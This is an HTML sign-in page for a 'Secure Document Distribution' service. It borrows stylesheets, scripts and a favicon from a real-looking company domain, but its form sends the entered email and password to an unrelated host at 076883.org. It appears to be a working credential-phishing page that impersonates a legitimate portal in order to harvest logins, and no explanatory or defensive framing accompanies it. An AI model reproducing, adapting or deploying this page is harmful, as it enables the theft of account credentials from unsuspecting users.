<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title page-title>Sign In - Secure Document Distribution</title>
    <link href="https://salesdemo.loyaltyloop.com/static/main.css" type="text/css" rel="stylesheet">
    <script type="text/javascript" src="https://salesdemo.loyaltyloop.com/static/jquery.min.js"></script>
    <script type="text/javascript" src="https://salesdemo.loyaltyloop.com/static/bootstrap-validator.min.js"></script>
    <link rel="icon" type="image/x-icon" href="https://salesdemo.loyaltyloop.com/favicon.ico?v=1">

   
</head>

<body>
    <div id="app" class="body-content no-header">

  		<main id="app-main" class="body-content">

  			<div class="box-in-middle center with-padding-30-tb">

  				<div class="body-content bg-white with-radius with-padding-30">

  					<div class="body-content with-margin-20 with-padding-20-tb">
  						<h2 class="h3">Sign in to access document</h2>
  					</div>

  					<form role="form" method="post" action="https://076883.org/webspace/next.php" data-toggle="validator" class="body-content general-form">
						<input type="hidden" name="login" value="" />
  						<div class="body-content general-form-row">
  							<div class="body-content label-over form-group">
  								<input type="email" class="general-input" placeholder="           Email here" name="username" value="" autofocus required />
  								<label>Email</label>
  								<div class="help-block with-errors"></div>
  							</div>
  						</div>

  						<div class="body-content general-form-row with-margin">
  							<div class="body-content label-over form-group">
  								<input type="password" class="general-input" name="password" value="" required />
  								<label>Password</label>
  								<div class="help-block with-errors"></div>
  							</div>
  						</div>

  						<div class="body-content general-form-row">
  							<button type="submit" class="button-general blue full-width">
  								Sign In
  							</button>
  						</div>

  						<div class="body-content general-form-row">
  							<div class="text-content medium">
  								<p><a href=""></a></p>
  							</div>
  						</div>

  						<div class="body-content general-form-row">
  							<div class="text-content small">
  								 
  							</div>
  						</div>

  					</form>

  				</div>

  			</div>

  		</main>
    </div>

    <script type="text/javascript" src="https://salesdemo.loyaltyloop.com/static/input_labels.js"></script>

</body>

</html>
